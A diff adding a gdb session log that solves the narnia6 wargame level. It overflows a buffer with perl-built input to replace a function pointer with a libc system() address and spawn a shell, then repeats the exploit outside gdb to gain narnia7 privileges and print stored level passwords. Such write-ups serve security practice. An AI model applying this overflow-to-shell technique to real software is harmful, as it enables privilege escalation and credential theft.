@@ -1,0 +1,106 @@
+###### THE PUTS() ADDRESS IS CONTAINED BY EAX REGISTER WHICH IS OVERWRITABLE #####
+
+
+(gdb) b *0x080486e7
+Breakpoint 1 at 0x80486e7
+(gdb) r AAAA BBBB
+Starting program: /narnia/narnia6 AAAA BBBB
+
+Breakpoint 1, 0x080486e7 in main ()
+(gdb) x/16x $esp
+0xffffd698:	0xffffd6a4	0x42424242	0xf7fc5300	0x41414141
+0xffffd6a8:	0x08048700	0x08048430	0x00000003	0x00000000
+0xffffd6b8:	0x00000000	0xf7e2a286	0x00000003	0xffffd754
+0xffffd6c8:	0xffffd764	0x00000000	0x00000000	0x00000000
+(gdb) info registers 
+eax            0x8048430	134513712
+ecx            0x36b6	14006
+edx            0x0	0
+ebx            0x36b6	14006
+esp            0xffffd698	0xffffd698
+ebp            0xffffd6b8	0xffffd6b8
+esi            0x3	3
+edi            0xf7fc5000	-134459392
+eip            0x80486e7	0x80486e7 <main+319>
+eflags         0x286	[ PF SF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) x/x $eax
+0x8048430 <puts@plt>:	0x99c825ff
+(gdb) r AAAAAAAABBBB CCCC
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /narnia/narnia6 AAAAAAAABBBB CCCC
+
+Breakpoint 1, 0x080486e7 in main ()
+(gdb) x/20x $esp
+0xffffd688:	0xffffd694	0x43434343	0xf7fc5300	0x41414141
+0xffffd698:	0x41414141	0x42424242	0x00000000	0x00000000
+0xffffd6a8:	0x00000000	0xf7e2a286	0x00000003	0xffffd744
+0xffffd6b8:	0xffffd754	0x00000000	0x00000000	0x00000000
+0xffffd6c8:	0xf7fc5000	0xf7ffdc0c	0xf7ffd000	0x00000000
+(gdb) info registers 
+eax            0x42424242	1111638594
+ecx            0x36b6	14006
+edx            0x0	0
+ebx            0x36b6	14006
+esp            0xffffd688	0xffffd688
+ebp            0xffffd6a8	0xffffd6a8
+esi            0x3	3
+edi            0xf7fc5000	-134459392
+eip            0x80486e7	0x80486e7 <main+319>
+eflags         0x282	[ SF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) x/x $eax
+0x42424242:	Cannot access memory at address 0x42424242
+(gdb) 
+
+#############################
+##############################
+
+(gdb) r $(perl -e 'print "A"x8 . "\x50\xc8\xe4\xf7" ."\t". "B"x4')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /narnia/narnia6 $(perl -e 'print "A"x8 . "\x50\xc8\xe4\xf7" ."\t". "B"x4')
+
+Breakpoint 1, 0x080486e7 in main ()
+(gdb) x/x $eax
+0xf7e4c850:	0x8b0cec83
+(gdb) c
+Continuing.
+sh: 1: AAAAAAAAP���: not found
+[Inferior 1 (process 31962) exited with code 01]
+(gdb) 
+
+#CHANGE THE STRING TO A COMMAND WHICH CAN BE EXECUTED LIKE 'sh'
+
+(gdb) r $(perl -e 'print "sh;" . "A"x5 . "\x50\xc8\xe4\xf7" . "\t". "B"x4')
+Starting program: /narnia/narnia6 $(perl -e 'print "sh;" . "A"x5 . "\x50\xc8\xe4\xf7" . "\t". "B"x4')
+
+Breakpoint 1, 0x080486e7 in main ()
+(gdb) c
+Continuing.
+$ id
+uid=14006(narnia6) gid=14006(narnia6) groups=14006(narnia6)
+$ cat /etc/narnia_pass/narnia6
+neezocaeng
+$ 
+
+#### NOW DO THIS OUTSIDE THE GDB #####
+
+narnia6@narnia:/narnia$ ./narnia6 `perl -e 'print "sh;" . "A"x5 . "\x50\xc8\xe4\xf7" . "\t" . "B"x4'`
+$ id
+uid=14007(narnia7) gid=14006(narnia6) groups=14006(narnia6)
+$ cat /etc/narnia_pass/narnia7
+ahkiaziphu
+$
+
